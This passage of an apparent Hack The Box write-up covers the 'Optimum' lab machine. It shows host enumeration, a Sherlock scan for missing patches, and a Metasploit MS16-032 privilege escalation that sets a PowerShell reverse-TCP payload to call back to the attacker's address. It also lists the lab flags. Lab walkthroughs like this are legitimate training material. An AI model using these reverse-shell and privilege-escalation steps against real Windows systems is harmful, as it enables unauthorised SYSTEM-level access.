+</span><span class="z-text z-plain">Event Log Readers                   Members of this group can read event logs from local machine                       
+</span><span class="z-text z-plain">Guests                              Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
+</span><span class="z-text z-plain">Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of Hyper-V.
+</span><span class="z-text z-plain">IIS_IUSRS                           Built-in group used by Internet Information Services.                              
+</span><span class="z-text z-plain">Network Configuration Operators     Members in this group can have some administrative privileges to manage configuration of networking features
+</span><span class="z-text z-plain">Performance Log Users               Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
+</span><span class="z-text z-plain">Performance Monitor Users           Members of this group can access performance counter data locally and remotely     
+</span><span class="z-text z-plain">Power Users                         Power Users are included for backwards compatibility and possess limited administrative powers
+</span><span class="z-text z-plain">Print Operators                     Members can administer printers installed on domain controllers                    
+</span><span class="z-text z-plain">RDS Endpoint Servers                Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.
+</span><span class="z-text z-plain">RDS Management Servers              Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.
+</span><span class="z-text z-plain">RDS Remote Access Servers           Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.
+</span><span class="z-text z-plain">Remote Desktop Users                Members in this group are granted the right to logon remotely                      
+</span><span class="z-text z-plain">Remote Management Users             Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
+</span><span class="z-text z-plain">Replicator                          Supports file replication in a domain                                              
+</span><span class="z-text z-plain">Users                               Users are prevented from making accidental or intentional system-wide changes and can run most applications
+</span><span class="z-text z-plain">WinRMRemoteWMIUsers__               Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
+</span></code></pre>
+<h3 id="nics">NICs</h3>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\kostas\Desktop<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> ipconfig <span class="z-keyword z-operator z-assignment z-powershell">/</span>all
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Windows IP Configuration
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Host Name . . . . . . . . . . . . : optimum
+</span><span class="z-text z-plain">   Primary Dns Suffix  . . . . . . . : 
+</span><span class="z-text z-plain">   Node Type . . . . . . . . . . . . : Hybrid
+</span><span class="z-text z-plain">   IP Routing Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">   WINS Proxy Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Ethernet adapter Ethernet0:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Connection-specific DNS Suffix  . : 
+</span><span class="z-text z-plain">   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
+</span><span class="z-text z-plain">   Physical Address. . . . . . . . . : 00-50-56-B9-E6-FB
+</span><span class="z-text z-plain">   DHCP Enabled. . . . . . . . . . . : No
+</span><span class="z-text z-plain">   Autoconfiguration Enabled . . . . : Yes
+</span><span class="z-text z-plain">   IPv4 Address. . . . . . . . . . . : 10.10.10.8(Preferred) 
+</span><span class="z-text z-plain">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+</span><span class="z-text z-plain">   Default Gateway . . . . . . . . . : 10.10.10.2
+</span><span class="z-text z-plain">   DNS Servers . . . . . . . . . . . : 10.10.10.2
+</span><span class="z-text z-plain">   NetBIOS over Tcpip. . . . . . . . : Enabled
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Tunnel adapter isatap.{99C463C2-DC10-45A6-9CC8-E62F160519AE}:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Media State . . . . . . . . . . . : Media disconnected
+</span><span class="z-text z-plain">   Connection-specific DNS Suffix  . : 
+</span><span class="z-text z-plain">   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2
+</span><span class="z-text z-plain">   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+</span><span class="z-text z-plain">   DHCP Enabled. . . . . . . . . . . : No
+</span><span class="z-text z-plain">   Autoconfiguration Enabled . . . . : Yes
+</span></code></pre>
+<p>There's an Ethernet interface and an ISATAP interface.</p>
+<h2 id="system-enumeration">System enumeration</h2>
+<h3 id="flags">Flags</h3>
+<p>If we check our Desktop folder, we find the user flag.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\kostas\Desktop<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-Content</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>C:\Users\kostas\Desktop\user.txt<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">906f8a34baa340c5c8bf81b2cfedef79
+</span></code></pre>
+<h3 id="known-vulnerabilities-1">Known vulnerabilities</h3>
+<p>Let's run <code>Sherlock</code> to check for known vulnerabilities that might affect
+Optimum. Maybe it's missing critical hotfixes?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\kostas\Desktop<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Find-AllVulns</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Title      : TrackPopupMenuEx Win32k NULL Page
+</span><span class="z-text z-plain">MSBulletin : MS13-081
+</span><span class="z-text z-plain">CVEID      : 2013-3881
+</span><span class="z-text z-plain">Link       : https://www.exploit-db.com/exploits/31576/
+</span><span class="z-text z-plain">VulnStatus : Not supported on 64-bit systems
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Title      : TrackPopupMenu Win32k Null Pointer Dereference
+</span><span class="z-text z-plain">MSBulletin : MS14-058
+</span><span class="z-text z-plain">CVEID      : 2014-4113
+</span><span class="z-text z-plain">Link       : https://www.exploit-db.com/exploits/35101/
+</span><span class="z-text z-plain">VulnStatus : Not Vulnerable
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Title      : ClientCopyImage Win32k
+</span><span class="z-text z-plain">MSBulletin : MS15-051
+</span><span class="z-text z-plain">CVEID      : 2015-1701, 2015-2433
+</span><span class="z-text z-plain">Link       : https://www.exploit-db.com/exploits/37367/
+</span><span class="z-text z-plain">VulnStatus : Not Vulnerable
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Title      : Font Driver Buffer Overflow
+</span><span class="z-text z-plain">MSBulletin : MS15-078
+</span><span class="z-text z-plain">CVEID      : 2015-2426, 2015-2433
+</span><span class="z-text z-plain">Link       : https://www.exploit-db.com/exploits/38222/
+</span><span class="z-text z-plain">VulnStatus : Not Vulnerable
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Title      : &#39;mrxdav.sys&#39; WebDAV
+</span><span class="z-text z-plain">MSBulletin : MS16-016
+</span><span class="z-text z-plain">CVEID      : 2016-0051
+</span><span class="z-text z-plain">Link       : https://www.exploit-db.com/exploits/40085/
+</span><span class="z-text z-plain">VulnStatus : Not supported on 64-bit systems
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Title      : Secondary Logon Handle
+</span><span class="z-text z-plain">MSBulletin : MS16-032
+</span><span class="z-text z-plain">CVEID      : 2016-0099
+</span><span class="z-text z-plain">Link       : https://www.exploit-db.com/exploits/39719/
+</span><span class="z-text z-plain">VulnStatus : Appears Vulnerable
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Title      : Windows Kernel-Mode Drivers EoP
+</span><span class="z-text z-plain">MSBulletin : MS16-034
+</span><span class="z-text z-plain">CVEID      : 2016-0093/94/95/96
+</span><span class="z-text z-plain">Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
+</span><span class="z-text z-plain">VulnStatus : Appears Vulnerable
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Title      : Win32k Elevation of Privilege
+</span><span class="z-text z-plain">MSBulletin : MS16-135
+</span><span class="z-text z-plain">CVEID      : 2016-7255
+</span><span class="z-text z-plain">Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
+</span><span class="z-text z-plain">VulnStatus : Appears Vulnerable
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Title      : Nessus Agent 6.6.2 - 6.10.3
+</span><span class="z-text z-plain">MSBulletin : N/A
+</span><span class="z-text z-plain">CVEID      : 2017-7199
+</span><span class="z-text z-plain">Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
+</span><span class="z-text z-plain">VulnStatus : Not Vulnerable
+</span></code></pre>
+<p>We find several candidates:
+<a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032">MS16-032</a>,
+<a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-034">MS16-034</a>
+and
+<a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-135">MS16-135</a>.</p>
+<h2 id="privilege-escalation-ms16-032">Privilege escalation (<a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032">MS16-032</a>)</h2>
+<p><a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032">MS16-032</a>
+is a Windows vulnerability affecting Windows 7 to Windows 10, and Windows Server
+2008 to Windows Server 2012. The vulnerability resides in the Secondary Logon
+Service (S4L), which is responsible for handling user logon requests. S4L
+utilizes a mechanism called &quot;Security Context Virtualization&quot; (SCV) to
+temporarily elevate the privileges of processes performing certain actions, such
+as accessing system resources. The flaw in SCV arises from improper handling of
+request handles, which are temporary tokens used to identify and manage user
+requests. An attacker can exploit this flaw by crafting applications to trick
+S4L into granting elevated privileges to processes that don't deserve them,
+hence escalating its privileges.</p>
+<h3 id="preparation-1">Preparation</h3>
+<p>I'll use the Metasploit module
+<code>exploit/windows/local/ms16_032_secondary_logon_handle_privesc</code> to exploit this
+vulnerability, since it's non-trivial to do by hand.</p>
+<p>However, this is a privilege escalation module, so it requires a Meterpreter
+session to run. Therefore, I'll use my existing reverse shell to get a
+Meterpreter session. It got assigned the number <code>1</code>.</p>
+<p>Then, I'll set the <code>target</code> to <code>Windows x64</code>, the <code>payload</code> to
+<code>payload/windows/x64/powershell_reverse_tcp</code>, the <code>RHOSTS</code> to <code>10.10.10.8</code>, the
+<code>LHOST</code> to <code>10.10.14.9</code>, the <code>LPORT</code> to <code>9002</code> and the <code>SESSION</code> to <code>1</code>.</p>
+<h3 id="exploitation-1">Exploitation</h3>
+<p>No we can launch the exploit!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">msf6</span></span><span class="z-meta z-function-call z-arguments z-shell"> exploit(windows/local/ms16_032_secondary_logon_handle_privesc</span><span class="z-meta z-function-call z-shell"></span>) <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> run
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PS C:\Users\kostas\Desktop&gt;
+</span></code></pre>
+<p>It went off without a hitch.</p>
+<p>However, I don't like Metasploit's shell, so I'll open my own on port <code>9003</code>.</p>
+<h2 id="system-enumeration-1">System enumeration</h2>
+<p>If we run <code>whoami</code>, we see that we're <code>NT AUTHORITY\SYSTEM</code>!</p>
+<h3 id="flags-1">Flags</h3>
+<p>As usual, we can find the root flag in our home folder.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Windows\system3<span class="z-keyword z-operator z-redirection z-powershell">2&gt;</span> <span class="z-support z-function z-powershell">Get-Content</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>C:\Users\Administrator\Desktop\root.txt<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">ac6fb04739d6d73a57df32c17d1f920f
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/optimum/success.png" alt="Success" /></p>
+<p>That's it for this box! 🎉</p>
+<p>I rated both the user and root flags as 'Very easy' to obtain. The foothold only
+required to find the proper CVE, and was quite easy to exploit. The privilege
+escalation was a bit harder to identify, but was trivial to exploit thanks to
+Metasploit.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
